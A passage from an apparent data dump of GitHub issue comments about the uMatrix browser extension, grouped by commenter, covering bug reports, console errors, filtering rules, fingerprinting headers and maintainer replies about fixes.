https://github.com/gorhill/uMatrix/wiki/How-to-get-past-%22uMatrix-has-prevented-the-following-page-from-loading%22.. The idea is if someone is unhappy with the 0-120 seconds gap before cookies are deleted by uMatrix, whitelist cookies in uMatrix and use a specialized extension which does what you want if you can find one.. Fix will be in dev build 1.3.7b1. Until next stable release is published, workaround is to slightly resize the browser window.. > he uMatrix table display 1.wyciwyg-scheme or 2.wyciwyg-scheme instead of aaa.bbb.ccc.net and lot of requests are blocked\nuMatrix uses and shows whatever is in the address bar -- this is the context in which the network requests are made.. Another case reported: https://www.reddit.com/r/uMatrix/comments/98rxfl/wrong_domain_detection_and_therefore_cant_create/.\nI could reproduce this one, and I created a workaround for this quirky Firefox behavior.. I don't even understand why someone would use SRWare Iron over Chromium itself.. Yes, sorry.\nCan you try the rule matrix-off: chrome-extension-scheme true?. I'm just investigating for now, not saying this is the definitive solution. . Well, I just looked at the code, matrix-off: chrome-extension-scheme true is part of the default ruleset at installation.\nWhat changed is that now uMatrix, just like uBO, will re-classify behind-the-scene network requests for which a context is provided. This context is something new that was added in Chrome 63, so that now uMatrix can properly filter behind-the-scene network requests. This has always been available on Firefox, but was not used by uMatrix until now.\nConsider https://github.com/gorhill/uMatrix/issues/684#issuecomment-372137117: now uMatrix can properly deal with this, the network request which was formerly left unfiltered can now be filtered, because now uMatrix is told that the \"initiator\" of the behind-the-scene network request is https://thedisconnect.co.\nThe current issue is a side effect of this fix: the \"initiator\" in the current case is the extension URL: chrome-extension://[extension id], hence why matrix-off: chrome-extension-scheme true is needed.\nNow the real issue is the logger not informing properly about this, it still shows the network request as being from the behind-the-scene scope, while it has been re-classified internally. I have been planning to fix this along with  https://github.com/gorhill/uMatrix/issues/951, which I have been wanting to fix since a while now, but haven't had the time yet -- I want the logger to provide the context in which network requests were made, just like in uBO, and from there it will become easy to diagnose/fix issues like the current one.\n. I was just trying to explain what is happening, I did not make a decision yet about what I will do if I decide to do something.. As said above, it's in the default ruleset.. Until I fix the logger, behind-the-scene network requests made in non-network URI contexts will not be reclassified.. Thanks.. Thanks.. Thanks.. I need a confirmation that vivaldi-scheme is really needed.\nFor example, Opera used to have a opera: scheme which was used instead of chrome:, and finally they are back using chrome:, and apparently have dropped opera:. Even opera://about which works in Opera's address' bar is internally translated to chrome://about, and this is what uBO sees.. Looks all good to me, thank you very much.. The PR changed the semantic of the block count on the matrix filtering button, and I questioned that. \nLooking again into it, I realize the matrix filtering button count badge is already broken anyways. \nThe intent was that the count reflects only what is blocked as a result of matrix filtering, not what is blocked as a result of other switches doing their work (you will notice the uMatrix icon badge differs from the matrix filtering button badge when you have referrer spoofing enabled).\nBut now I see it's broken anyways since resources blocked as a result of \"Forbid mixed content\" are reported on the matrix filtering button anyways.\nSo I will merge the request, keeping in mind there is still something to fix (unrelated to the PR) with regard to the matrix filtering button badge count.. Reverting because authorship was not maintained by GitHub.. Thanks for contributing.. It's fixed on my side since yesterday. You can't just add extraHeaders like this, you have to check for version otherwise this breaks pre-73 versions and whether this is Chromium.. \"Fixed on my side\" means I already have the fix locally. I didn't immediately commit/tag a new build because it's on top of another fix, and I wanted to test more. Just adding extraHeaders breaks Chromium pre-72 (first thing I checked) and possibly Firefox. However I revised the fix to use the approach from the Chromium dev pointed above by @gwarser, I was testing using vAPI.webextFlavor -- which works fine but I prefer the officially suggested approach.\nAlso, it's not needed for onHeadersReceived.. > Lets say I have a scriptlet thats designed for not sending cookies\nMakes no difference, there is no code in uBO to deal with Cookie header.. ",
    "my-password-is-password": "The first line is\n\nError in event handler for webRequest.onBeforeSendHeaders/2: undefined is not a function\nStack trace: TypeError: undefined is not a function\n    at \u00b5Matrix.webRequest.onBeforeSendHeadersHandler (chrome-extension://egcodlnmejbejgffgmjihcknjmlmnobb/js/traffic.js:475:62)\n    at subEventCallback (extensions::webRequestInternal:88:32)\n    at EventImpl.dispatchToListener (extensions::event_bindings:397:22)\n    at Event.publicClass.(anonymous function) [as dispatchToListener] (extensions::utils:93:26)\n    at EventImpl.dispatch_ (extensions::event_bindings:379:35)\n    at dispatchArgs (extensions::event_bindings:247:26)\n    at dispatchEvent (extensions::event_bindings:256:7) \n\nLaunching Chrome and going straight to the console log.\n\n. It was a request to https://www.google.com/searchdomaincheck?format=url&type=chrome.\n\nShould it be \u00b5m.scopeFromUrl(....) instead of this?  When I changed it the error went away.\n. Saw 2 more errors in the console.  I have every checkbox in Privacy and Hosts Files checked.\n\n\nUsing \u00b5Matrix 0.8.0.0-alpha.6.\n. Yeah, its not a big deal.  Thanks\n. Chrome Version 38.0.2125.104 m\n. Thanks, I just installed alpha 12 and its working.  Theres still an error when you actually click the \"\u202ablacklisted hostname(s)\" cell in the blacklist meta row.\n. Yeah i saw it report the wrong numbers again\n. A reset/clear button for the Request logs on the Statistics page would be cool.  Right now to do something like this you have to:\n1.) Change the \"Remember the last  #  HTTP requests per page\" to 0.\n2.) Click the Refresh button\n3.) Then Change it back to the # of request you want.\n4.) Click the Refresh button\nThe steps above worked in HTTPSB but I think theres a bug in uMatrix.  Do all 4 steps and makes a new request after step 4 and click the Refresh button... it doesn't show up in the logs.  If you go to another tab on the dashboard and back to Statistics its still shows 0 instead of the # from step 3.\n. But in HTTPSB those steps don't work either and that still uses jQuery, right?  I could have sworn this is how i would reset in HTTPSB.\n. i mean changing the checkboxes for Pages  Blocked  Allowed  Cookies  Images  CSS  Plugins  Scripts  XHRs  Frames  Others\nSo if I change it to just show Blocked Scripts and F5, it resets and all the checkboxes are checked.\n. Do you use uBlock?  I can get the pastebin search results to work in uMatrix with uBlock disabled when the matrix looks like this,\n\n\nWith uBlock enabled one of the 3rd party filters blocks ||google.com/cse/.\n\n\nSo in uBlock if you add @@||google.com/cse/ to \"Your filters\" and apply, the pastebin search results show.\n\n. I can confirm it was messing with the flags... again.  Doesn't crash anymore since I reset to default.\n. Maybe its not the flags.  I made a note of the flags I had changed before resetting,\n\nEnable Download Resumption\nDisable NTP 'Other devices' menu.\nEnable SPDY/4\nEnable Panels\nDisable hyperlink auditing\nEnable fast tab/window close\nExperimental Extension APIs\nDisable WebGL\n\nI re-enabled those flags again and it doesn't crash anymore.  So i'm guessing its how I just unzip a newer version of chromium on top of an old version.??? idk\n. uMatrix.chromium-0.8.0.0-rc.1\n. Ok it crashed going back to  0.8.0.0-rc.0.\n\n. Let me reset the flags and try restore from a file and see if it still crashes.\nDoesn't crash after resetting the flags for  0.8.0.0-rc.0.  So its not a uMatrix problem.\n. Yeah just those flags listed earlier don't crash it.  Let me try again because I just noticed that those flags were \"enable/disable\" flags.  So I might have missed some flags that use a dropdown list.\n. Ok.  It had nothing to do with flags.  Here are the steps to crash chromium on my computer.\n1.) Remove uMatrix and reset flags\n2.) Close Chromium\n3.) Start Chromium\n4.) Install uMatrix\n5.) In uMatrix try to either \"Restore from file...\" or \"Reset to default settings\"\nCan reproduce every time.  No other extensions running.  No messing with flags.\nHeres a video i made,\nhttp://uux3.altervista.org/crash.webm\nTried with both rc.0 and rc.1.  Both crashed.\nChromium Version 40.0.2210.0\n. Is @Cilverjolt using Windows XP like me?  Might be a Windows XP problem.\nOk I posted a crash report with my video on that thread.\n. @Cilverjolt can you reproduce following the steps above?\n@gorhill, heres the new thread https://code.google.com/p/chromium/issues/detail?id=430549  .  Should I delete that comment in that other thread?\n. Like any time after it checks if the web page should flush the stats.\n. I have a quick way to get urls stuck in the list but I don't know if the quick way is part of the problem.\n1. Go to wired.com\n2. Open like 10+ links in a new tab\n3. On the wired.com tab, right click and do a \"Close tabs to the right\"\n4. Check the drop down in Statistics\n. Stable Chrome 38.0.2125.111 m\nThis is a screenshot of my dropdown list after doing the steps above like 3 or 4 times.\n\nAll tabs are closed and those urls never go away.\n. This is what it printed out\n\n\"http://chromium-behind-the-scene/\nhttp://chrome-extension-scheme/\nhttp://www.wired.com/2014/11/ikea-bekant-desk/\nhttp://www.wired.com/2014/11/airhopper-hack/\nhttp://www.wired.com/2014/11/oral-history-through-being-cool/\nhttp://www.wired.com/2014/10/virgin-galactics-spaceshiptwo-crashes/\nhttp://www.wired.com/2014/10/max-headroom-interupt/\nhttp://www.wired.com/2014/11/this-week-in-trailers-27/\nhttp://www.wired.com/2014/10/scariest-non-horror-movies/\nhttp://www.wired.com/2014/10/best-week-tv-34/\nhttp://www.wired.com/2014/10/cape-watch-9/\nhttp://chrome-scheme/\nhttp://www.wired.com/2014/11/sneak-peek-adobes-smart-new-ipad-app-designers/\nhttp://www.wired.com/2014/10/navy-self-driving-swarmboats/\nhttp://www.wired.com/category/design\nhttp://www.wired.com/2014/10/hypnotic-video-takes-tripping-worlds-greenhouses/\nhttp://www.wired.com/2014/10/sliders-knobs-dials-give-tablet-physical-interface/\nhttp://www.wired.com/2014/10/bizarre-toy-cameras-heralded-age-instagram/\nhttp://www.wired.com/2014/10/flipboard-3-smartphone-app/\nhttp://www.wired.com/2014/10/mit-media-lab-gets-transforming-logo-courtesy-pentagram/\nhttp://www.wired.com/2014/10/saddest-cubicles/\nhttp://www.wired.com/2014/10/23-beautiful-products-make-waking-suck-little-less/\nhttp://www.nytimes.com/2013/10/27/arts/artsspecial/venturing-beyond-art-to-\u2026ace.html?adxnnl=1&pagewanted=all&adxnnlx=1383070183-I/YzzTLVzDAhRh//EI1fjg\nhttp://www.nytimes.com/glogin?URI=http://www.nytimes.com/2013/10/27/arts/ar\u2026Q235Kk7Q7EzQ24kCDVKfTkQ5BDRz7D7TDCQ245KDQ24Q5BKRuD7!KQ24zDueRQ7DKX!7Q3EQ5C\nhttp://www.nytimes.com/2013/10/27/arts/artsspecial/venturing-beyond-art-to-\u2026tml?adxnnl=1&pagewanted=all&adxnnlx=1383070183-I/YzzTLVzDAhRh//EI1fjg&_r=0\nhttp://jalopnik.com/meet-the-guy-who-drove-across-the-u-s-in-a-record-28-h-\u2026lflow_jalopnik_facebook&utm_source=jalopnik_facebook&utm_medium=socialflow\nhttp://www.wired.com/entertainment/\nhttp://www.wired.com/2014/11/geeks-guide-women-destroy/\nhttp://www.wired.com/2014/10/gamelife-podcast-episode-132/\nhttp://www.wired.com/2014/10/double-action-boogaloo/\nhttp://www.wired.com/2014/10/nintendo-sleep-qol-health/\nhttp://www.wired.com/2014/10/civilization-beyond-earth-review/\nhttp://www.wired.com/2014/10/super-friends-hall-of-justice/\nhttp://www.wired.com/2014/10/sam-max-hit-road-download/\nhttp://www.wired.com/2014/10/mark-mothersbaugh-devo-gallery/\nhttp://www.wired.com/2014/10/binge-guide-fringe/\nhttp://www.wired.com/2014/10/what-to-do-in-washington-dc/\nhttp://www.wired.com/2014/10/marvel-next-5-years-of-movies/\nhttp://arstechnica.com/\nhttp://arstechnica.com/gadgets/2014/11/nexus-9-review-a-premium-tablet-with-a-not-so-premium-feel/\nhttp://arstechnica.com/business/2014/11/from-cash-only-to-nfc-ready-how-we-buy-determines-what-we-buy/\nhttp://arstechnica.com/apple/2014/11/yes-the-5k-retina-imacs-screen-runs-at-60hz-at-5k-resolution/\nhttp://arstechnica.com/information-technology/2014/11/remoteie-gives-free-access-to-internet-explorer-vms-without-the-vm/\nhttp://arstechnica.com/security/2014/11/does-your-phone-company-track-you/\nhttp://arstechnica.com/tech-policy/2014/11/man-sentenced-to-a-year-in-jail-for-firing-laser-50-times-at-police-plane/\nhttp://arstechnica.com/business/2014/11/sprint-dropping-customers-losing-money-and-laying-employees-off/\nhttp://arstechnica.com/security/2014/11/researchers-bridge-air-gap-by-turning-monitors-into-fm-radios/\nhttp://arstechnica.com/tech-policy/2014/11/napster-netflix-founders-top-donors-in-california-voter-politics/\nhttp://arstechnica.com/apple/2014/11/apple-1-computer-sold-out-of-steve-jobs-garage-could-pull-in-600k-or-more/\nhttp://arstechnica.com/security/2014/11/cell-carrier-was-weakest-link-in-hack-of-google-instagram-accounts/\nhttp://arstechnica.com/science/2014/11/ntsb-spaceshiptwo-broke-apart-when-feathering-activated-early/\nhttp://arstechnica.com/gaming/2014/11/hearthstone-bot-maker-closes-shop-after-blizzard-crackdown/\nhttp://arstechnica.com/science/2014/11/as-earth-left-the-last-ice-age-co2-rose-in-fits-and-starts/\nhttp://arstechnica.com/gaming/2014/11/nintendo-president-says-company-must-consider-removing-region-locks/\nhttp://arstechnica.com/business/2014/11/epic-2014-recalling-a-decade-old-imagining-of-the-tech-driven-media-future/\nhttp://arstechnica.com/science/2014/10/one-feared-dead-as-virgin-galactic-spaceshiptwo-destroyed-in-test-flight/\nhttp://arstechnica.com/tech-policy/2014/10/virginia-judge-police-can-demand-a-suspect-unlock-a-phone-with-a-fingerprint/\nhttp://arstechnica.com/security/2014/10/facebook-offers-hidden-service-to-tor-users/\nhttp://arstechnica.com/information-technology/2014/10/consumer-windows-7-preinstalls-come-to-an-end-today/\nhttp://arstechnica.com/apple/2014/10/microsoft-updates-creaky-old-office-2011-for-mac-to-shiny-new-version/\nhttp://arstechnica.com/gadgets/2014/10/andy-rubin-the-founder-of-android-leaves-google/\nhttp://arstechnica.com/gaming/2014/10/updated-numbers-show-ps4-with-at-least-65-percent-of-two-console-market/\nhttp://arstechnica.com/security/2014/10/drupal-sites-had-hours-to-patch-before-attacks-started/\nhttp://arstechnica.com/tech-policy/2014/10/google-ordered-to-pay-a-woman-2250-for-street-view-image-showing-cleavage/\nhttp://arstechnica.com/tech-policy/2014/10/pirate-bay-co-founder-convicted-in-denmarks-largest-hacking-case-ever/\nhttp://arstechnica.com/tech-policy/2014/10/after-massive-danish-hack-gottfrid-svartholm-warg-sentenced-to-3-5-years/\nhttp://arstechnica.com/gadgets/2014/10/a-first-look-at-the-microsoft-band/\nhttp://arstechnica.com/business/2014/10/fcc-reportedly-close-to-reclassifying-isps-as-common-carriers/\nhttp://arstechnica.com/science/2014/10/learn-inflationary-cosmology-from-the-guy-who-invented-it/\nhttp://arstechnica.com/tech-policy/2014/10/verizon-wireless-to-pay-back-customers-allegedly-billed-for-free-calls/\nhttp://arstechnica.com/science/2014/10/in-mice-genetics-dictates-ebola-infection-outcomes/\nhttp://arstechnica.com/gaming/2014/10/zuckerberg-sees-50-to-100-million-oculus-units-sold-in-next-decade/\nhttp://arstechnica.com/tech-policy/2014/10/feds-bust-online-dating-service-that-sent-fake-messages-from-virtual-cupids/\nhttp://arstechnica.com/apple/2014/10/class-action-suit-alleges-2011-apple-macbook-pros-were-defective/\nhttp://chrome-devtools-scheme/\"\n\nAnd this is what the drop down list looks like now.\n\n. \n\"http://chromium-behind-the-scene/\nhttp://chrome-extension-scheme/\nhttp://www.wired.com/2014/11/ikea-bekant-desk/\nhttp://www.wired.com/2014/11/airhopper-hack/\nhttp://www.wired.com/2014/11/oral-history-through-being-cool/\nhttp://www.wired.com/2014/10/virgin-galactics-spaceshiptwo-crashes/\nhttp://www.wired.com/2014/10/max-headroom-interupt/\nhttp://www.wired.com/2014/11/this-week-in-trailers-27/\nhttp://www.wired.com/2014/10/scariest-non-horror-movies/\nhttp://www.wired.com/2014/10/best-week-tv-34/\nhttp://www.wired.com/2014/10/cape-watch-9/\nhttp://www.wired.com/2014/11/sneak-peek-adobes-smart-new-ipad-app-designers/\nhttp://www.wired.com/2014/10/navy-self-driving-swarmboats/\nhttp://www.nytimes.com/2013/10/27/arts/artsspecial/venturing-beyond-art-to-\u2026tml?adxnnl=1&pagewanted=all&adxnnlx=1383070183-I/YzzTLVzDAhRh//EI1fjg&_r=0\nhttp://jalopnik.com/meet-the-guy-who-drove-across-the-u-s-in-a-record-28-h-\u2026lflow_jalopnik_facebook&utm_source=jalopnik_facebook&utm_medium=socialflow\nhttp://www.wired.com/2014/10/binge-guide-fringe/\nhttp://chrome-devtools-scheme/\"\n\nI noticed every now and then when i'm scrolling the drop down list it takes me back to \"All\".  Is that the clean up its doing?  Could it be that I'm closing theses tabs while its busy cleaning up?\n. No worries, not a big deal anyway.\n. I saw and error but I cleared it and trying to get it again.  It was something about the badge and not being able to find the tab with a certain id.\nlol.  I got blue screen of death doing this over and over. \n. They all had ids greater than 0.  And the badge error i mentioned earlier had nothing to do with it.  I console logged the tabIds on the left.\n\n. I think it was one of the flags I was using, chrome://flags/#enable-fast-unload.  If not that one, some other flag.\nI reset the flags and so far it hasn't been doing it.\nYeah, it was some flag I had changed.  Its working good now.\nI'm so sorry for wasting your time.  :(\n. I tried to see if you could add a hidden scrollbar to scroll long domain names. It works but screws up the spacing of the cells.  When I tried it in uMatrix It also messes with the hotspot if you scrolled.\nhttp://jsfiddle.net/d9ae0drd/3/\n. @Quurks, here's an addon that works on google search redirects.\nhttps://github.com/xwipeoutx/undirect\n. Saw something weird happen today, theres an extension that breaks uMatrix's Strict HTTPS.  The extension is called Poper Blocker, its a pop up blocker. \nhttps://chrome.google.com/webstore/detail/poper-blocker/bkkbcggnhapdmkeljlodobbkopceiche\nTest page 1: https://nda.creative-assembly.com/form/kingdom/thank-you\nPoper Blocker enabled\n\nPoper Blocker disabled\n\n\nTest page 2: https://www.bennish.net/mixed-content.html\nPoper Blocker enabled\n\nPoper Blocker disabled\n\nDefault Flags\nChrome 39.0.2171.71 m\nWindows XP\nEverything in uMatrix's Privacy tab checked\n. \nAll the images that got through were loaded using background-image: url(...) or background: url(...).  The only image that got blocked correctly was http://d1ju58c4ctua8y.cloudfront.net/theme_assets/images/kingdoms/logo-450px.png which was in an <img>.\nSame for test page 2.  The Sexy_Ben.jpeg that was loaded was by background-image: url()\nThis is just an observation, I still don't understand.\nWhen you pretty print the jquery code and put a breakpoint on the line 709, the images get blocked.  Remove the breakpoint and the images load.  Does timing matter?\n\n. It does it for other extensions too ( uBlock, Ghostery, ABP ).   Open and closing the popup over and over.\n. If you go to the extension page ( chrome://extensions/ ) and scroll down to the very bottom, theres a \"Keyboard shortcuts\" on the bottom right where you can set the shortcuts to whatever you want.\n\n\n. Another thing to remember is that just because requests shows up green in uMatrix it doesn't exactly mean the requests are being made. uBlock may be blocking it so you have to check in uBlock's log.\n. Nope.  Everything under Privacy is unchecked.\n. https://github.com/gorhill/uMatrix/issues/84\nSet a keyboard shortcut for Activate the Extension for uMatrix\n. @gorhill Whoops, I think you have to allow scripts for google in the matrix\n. 1) Search for something on https://images.google.com/\n2) Middle click on any image\nThats how i got there.\n. Inside the <noscript> theres this, <style>table,div,span,p{display:none}</style>.  Since the workaround for <noscript> was to use <div> it gets hidden too.  I think thats whats happening.\n. ",
    "Mikey1993": "+1\nI would gladly translate it on Crowdin :)\n. This is a blessed move on my part (I am the Hebrew translator on Crowdin), and would be glad to help.\n. Sure thing, I agree.\n. The top toolbar should be reverse-ordered, e.g. the \"mozilla.org\" drop down list on the most right, then the power button icon, then the lock icon and so on.. \nWhile the matrix columns should be as shown in your image.\nAlthough I see that some of the titles are cut out, is it something you are gonna address?\nThanks for your work!\n. Yes, I was silly and didn't update uMatrix to the latest version where you've applied the second patch to this issue - it looks like in your image.\nBTW, I am worried about the cut off of some of the headers on the matrix, I have no shorter names or abbreviations for them... \nAny thoughts about that?\n. Actually... I think that the font that English uses is narrower than the one that is used by Hebrew.\nCan we sort this out and ultimately fix the cut off?\n. That way you can allegedly see what the page has done after it has reloaded.\ne.g If I would like to look for only the resources of XHR requests of a YouTube video page after the initial loading.\n. Sure thing, I have removed the references to uBlock on the issue.\nIs this more clear?\nAnd about your reference to uBlock: \nThen how about a counter in the statistics page to correct the misunderstanding that could cause someone to think that uBlock isn't reporting the right number of blocked URLs?\nThough, the issue that was reported here with uBlock is that the statistics that are being reported after going back on Github are totally wrong (not changing accordingly to the page shifting), and not about the number of accounted net requests on a given page in the statistics tab.\n. I am also able to reproduce this issue on GitLab:\nhttps://gitlab.com/fdroid/fdroidclient\nWhen clicking on one of the top bar pages and going back with the mouse button.\n. You forgot also the the labels beside the checkboxes.\nthese ones:\n<label><input id=\"show-cookie\" type=\"checkbox\" checked value=\"1\">Cookies</label>\n<label><input id=\"show-image\" type=\"checkbox\" checked value=\"1\">Images</label>\n.....\n.....\n. Could be very useful and time saving.\nProbably the support, if implemented, has to be site specific (Facebook, Google and etc.).\n. @gorhill If I may ask, why uBlock can't see the behind the scenes requests?\nIs it just not implemented? uMatrix exclusive for some reason?\n. I like this one too.\nTidier configurations FTW.\n. https://github.com/gorhill/uBlock\n. ",
    "harshanvn": "Not sure if i understood you correctly or if i explained correctly...\nStep 1: Whitelist a local cell (so rule count will be 1)\nStep 2: Whitelist the same in global cell (rule count increases to 2)\n- Experiment 1: If i save here, below 2 entries are inserted..\n  - github.com collector-cdn.github.com script allow\n  - * collector-cdn.github.com script allow\nStep 3: revert step 1. Shouldn't rule count be 1 now?\n- Experiment 2:  If i save here, below 2 entries are inserted to \"Your rules\"\n  - * collector-cdn.github.com script allow\n  - github.com collector-cdn.github.com script *_inherit\n- *Experiment 3: If only step2 performed, not step 1 and step3, below entry is saved..\n  - * collector-cdn.github.com script allow_\n. Ok. Can you tell me the meaning of inherit in the rule syntax. It was added when doing below steps..\n\n. I may be completely wrong here. Just throwing my 2 cents here...\n\nif ( typeof this.status === 'number' && this.status >= 200 && this.status < 300 ) {\n\nIn the above line of code, i don't see why we need a first condition here. As http status code will always be of type number. Below condition itself may be enough..Sorry if am wrong here..\n\nif ( this.status >= 200 && this.status < 300 ) {\n\nPlease see the link below for list of status codes-\n     * http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html\n. hmm...ok. I am just thinking whether this situation can occur ever, as property type of status should never change. Anywayz, better safe than sorry :)\n. > Strict HTTPS?\nYes, the issue occurs with Strict HTTPS switch turned on.\nAs said in my earlier post, even when you whitelist a page, Strict HTTPS will continue to be active on that page (when it is enabled). Not sure if this is by design.\n. Ok Thanks. Now the things are clear to me.\n. I am able to see the some of the  blocked requests in both the extensions.\nSteps to Reproduce\n\nOpen Request logger for both the extensions\nOpen New Tab and goto tomshardware.com\n\nYou will see same requests blocked in the both the extensions, as reported in their respective loggers \nConfig\nuBlock v0.9.9.1\nuMatrix v0.9.1.3\nFF v38.0.5 & W8.1\n\n. @gorhill \nYou will see some of the requests (like an image from tracking.tomsguide.com/beacon) is blocked by both the extensions, and the same can be seen in the above post's screenshot. \nI am not sure if blocking the same requests in two extensions is the intended design..\n. ",
    "tharrisone": "This is very strange, I deleted my chromium folder started fresh installed uMatrix and set my privacy settings appropriately and 30 mins later the blocked cookies are still in my list via chrome://settings/cookies. I could make a video if you like, also I am on chromium-dev vers Version 40.0.2194.2 (64-bit)\n. ",
    "WagnerGMD": "Right now, the ultimate aim seem's far away... The blank page has only one control : one close button...\nIn fact, it will be nice to add some options (now). A (simple) way to disable uMatrix ? By a right click (on the uMatrix icon), the user will have the choice (one tab or fully ?).\nI assume, many users don't want to create a rule each time they met a redirect.\nOtherwise, you could also think to add one feature like a redirect cleaner ? Maybe you could clean the redirect and provide a link ? And add this (clean) link inside the inform ?\n. Since the v0.19pre0, Policeman has introduced a way to handle a redirect. You should maybe take a look. Maybe you don't have any idea to add such feature ? From my point of view, it's a good way (or a source of inspiration).\n. It seem's that you made a mistake. Because it's just a question and a suggestion (nothing else, nothing more). It's normal to ask a question or to try to understand.\n. I believe too that uMatrix could be better. Like said a lot of website integrate YouTube (etc). So, via one click on the button, uMatrix should be eable to create (directly) the right rules for the media (etc). Only a few rules are enough.\nIt would be useful because one user simply need somtimes to create temporary rules. By default, it sould be temporary. After, the user confirm (save).\nI block everything. Then, no I don't want to create a global rule like :\n* ytimg.com image allow\nAlso, it will simplify the process when a user start from scratch. I think about regulary, since a very long time (>6 months). It could be nice as a new (or back ? Recipes ?) feature and perhaps gorhill the day to be brave is not far...\nOne example below :\n```\nmalwaretips.com s.ytimg.com css allow\nmalwaretips.com ytimg.com image allow\nmalwaretips.com s.ytimg.com script allow\nmalwaretips.com www.youtube.com script allow\nmalwaretips.com www.youtube.com xhr allow\nmalwaretips.com www.youtube.com frame allow\nmalwaretips.com googlevideo.com xhr allow\nmalwaretips.com redirector.googlevideo.com * block\n\nComment\nIt's works fine\n\n\n\n\n\nblock\n\n\n\n\n\nredirector.googlevideo.com * block\n```\n\nPerhaps there's also something about (the damn) Recaptcha :\n```\nhttps://www.google.com/recaptcha/\nBy the past : https://www.gstatic.com/recaptcha/\nTo complete one day...\nRecaptcha doesn't figure on the url, it's loaded by two websites (google.com and gstatic.com).\n\nwww.google.com frame allow\nwww.google.com image allow\nwww.google.com script allow\nwww.google.com xhr allow\nwww.gstatic.com image allow\nwww.gstatic.com script allow\n``\n. Indeed, the first one is very very long to load... Apparently, it's require the **HTML5 SessionStorage** (dom.storage.enabled`) to wok fine.\n\nSo after one update (FireFox_v52.0.2 and uMatrix_v0.9.9b12), the trouble seem to be gone now (and at the end, I saw the message in the browser console (reported as null when it was disable)).. Like I said, it was mentionned there. By the word Mozilla, I refer to Firefox and from my point of view, it's clear (or obvious) but I decide to add the links.\nSo, to resume yes there are the latest (as today like FireFox_v52.0.2 and uMatrix_v0.9.9b12).. > Nightly is not Firefox.\nNone sense at all... I won't argue on this matter but in fact, it isn't a specific trouble about the current version (neither FireFox or  uMatrix).\nTo resume, In the last two weeks, I had met the trouble (a few times by day). And like I was assuming, there's still nothing in the browser console... \nAbout the AV. by the past it was eset_v9 (under W8.1) and now, it's eset_v10 (under W10).\nThe firewall is provide by Windows.\n. Thank you for the explanation @gorhill and for the solution @theWalkingDuck which seeem's to work fine and no I wasn't aware.\nAs personal reminder (another subject maybe for the futur) :\nIt wouldn't be better to provide a correct url ? As today, we can't read the url because the people didn't disable the function known as : Block all hyperlink auditing attempts.\n```\ndef RewriteWrongAdress(SampleURL):\n    import re\n    SampleURL = re.sub(\"(?i)%2F\",\"/\",SampleURL)\n    SampleURL = re.sub(\"(?i)%2E\",\".\",SampleURL)\n    SampleURL = re.sub(\"(?i)%5F\",\"_\",SampleURL)\n    SampleURL = re.sub(\"(?i)%3A\",\":\",SampleURL)\n    SampleURL = re.sub(\"(?i)%3D\",\"=\",SampleURL)\n    SampleURL = re.sub(\"(?i)%3F\",\"?\",SampleURL)\n    print(SampleURL)\n    return;\nThe WebExtension can't use one language as Python (perhaps Rust, etc) ?\nIt's sound very easy to fix and it might a little good improvement.\n```\n. For the record :\n\nuMatrix_Legacy won't receive any update but it still available (etc)...\n\nI'm wonder it wouldn't be better to add one article on this matter ? Because on the moment, I haven't find these informations on the uMatrix Wiki. \n- https://github.com/gorhill/uMatrix/releases\n- https://github.com/gorhill/uMatrix/releases/tag/1.1.4\n- https://github.com/gorhill/uMatrix/releases/download/1.1.4/uMatrix.firefox.xpi\n- https://github.com/gorhill/uMatrix/issues/824\n* * * block\n* 1st-party css allow\n* 1st-party image allow\ntwitter.com twimg.com css allow\ntwitter.com twimg.com image allow\nAs today, I had noticed a very strange behavior : an infinite loop on Twitter (under Windows 10 x64 with Firefox_v59 or Firefox_v57). That's why I can't read it (despite these rules).\nIn fact, I had met this trouble right after the installation of uMatrix_WebExtension_v1.2.0. And I had check it, the trouble doesn't seem to exist with uMatrix_Legacy_v1.1.4 (and according to these links, it will be the last one).\n```\nIf you need one example just try to open the second link :\n1) https://mobile.twitter.com/waterfoxproject\n2) https://www.twitter.com/waterfoxproject\nTo stop the loop, you will need to create this rule : \"twitter.com 1st-party cookie allow\"\nNo it doesn't stop the redirection.\nBut Twitter will be now accessible (readable without javascript) at this adress : https://mobile.twitter.com\nFrom my point of view, that's a bad design. Because any website should be able to load the CSS without them (cookies, javascript, etc).\nCould you confirm it ?\nWe can't stop (neither extract (recopy, etc) the data from) the uMatrix Logger ? Where is the button (and which one ? Add one label to describe the button because it's missing (nothing as text appears to identify the buttons **CSS:hover**)) ? Unless it was broken by the loop ?\n  . If you don't want to use the uMatrix GUI, you can create these rules :\n 1st-party css allow\n 1st-party image allow\n```\nFrom my point of view too, it won't be a bug neither a workaround. Because apparently no you aren't familiar with uMatrix.. ",
    "CrisBRM": "I suppose a toggle under 'strict https' would be nice addition since it's still bound by the scopes.\n. @mailinglists35 Select all lists on uMatrix. Uncheck all lists that you checked on uMatrix, on uBlock.\n. Sender of the email here. \nCan confirm Ghostwords' extension works, in that it modifies the HTTP_ACCEPT headers, as they were previously conveying 18.37 bits of identifying information.\nUsing Tor's UA is not the way to go though, If we consider the most used browsers are Chrome 38 and Firefox 33, respectively (since both browsers auto-update by default, it's safe to assume the latest version is the most used one).\nOn \u00b5Matrix's compatibility with Chameleon: they work well together and I don't think they overlap in terms of functionality (once you disable UA spoofing on \u00b5Matrix for all scopes), according to the documentation I've read thus far. However, it's not super lightweight, using as much memory as \u00b5Block itself.\n\n(Using \u00b5Matrix to block everything but CSS and images from being requested, the number went down to 1 in ~1700)\nHTTP_ACCEPT: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 gzip, deflate en-us,en;q=0.5\n. @jankkm Whilst I can't confirm the veracity of your initial statement (though it does seem suspicious), HTTP_REQUEST headers are not browser dependant and constitute an enormous privacy risk for tech literate people from smaller countries.\n. Actually, I believe he said he was planning to.\n. @githubdbes1 That's hardly relevant, but Firefox has had Vertical Tabs / Tree style tab for a while.\n. If you were such an advanced user you'd actually read the documentation/wikis, instead of asking to be spoonfed, despite the fact there are plenty of articles there which specifically compare those pieces of software. \n. What I meant is that uMatrix should present the user with tooltips regarding the location/name of the script, on mouse over, without having to resort to the network logger.\n. > I just want to block ads\nErr, that's \u00b5Block's area of expertise, \u00b5Matrix doesn't inject cosmetic filters.\n. Gorhil will probably not do this (rightly so in my opinion) because it would make everything unintuitive and more confusing, and there would need to be a separation to know which is which, which would also make things rather cluttered.\nFurthermore, the behind-the-scenes matrix is pretty much \"use and forget\" after a full day of use, since they don't really disappear until after you relaunch chrom*.\n. It's obviously local timezone.\nAs for the date... I don't find it relevant. The logging of network requests has an upper bound of 999 and there really is no point for it to be any higher, save maybe for someone researching HTTP requests  using statistics, in which case you can easily modify the value and compile the 